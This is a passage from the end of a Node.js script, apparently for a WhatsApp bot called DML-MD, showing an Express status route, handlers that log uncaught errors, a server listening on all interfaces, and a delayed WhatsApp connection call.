  res.send("DML-MD STARTED ✅")
})

// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

app.listen(port, '0.0.0.0', () => console.log(`Server listening on port http://0.0.0.0:${port}`))

setTimeout(() => {
  connectToWA()
}, 8000)
